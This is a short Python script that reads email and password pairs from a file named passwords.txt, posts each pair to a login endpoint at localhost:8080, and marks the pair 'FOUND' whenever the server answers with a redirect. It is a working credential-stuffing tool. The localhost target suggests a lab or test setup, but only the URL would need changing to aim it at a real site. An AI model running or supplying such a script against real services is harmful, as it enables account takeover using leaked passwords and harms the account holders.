import requests

with open("passwords.txt") as f:
    lines = f.readlines()

for line in lines:
    email, pwd = map(str.strip, line.split(','))
    r = requests.post('http://localhost:8080/login', data={"email": email, "password": pwd}, allow_redirects=False)
    print('{}\t{}\t{}'.format(email, pwd, "FOUND" if r.status_code == 302 else "-"))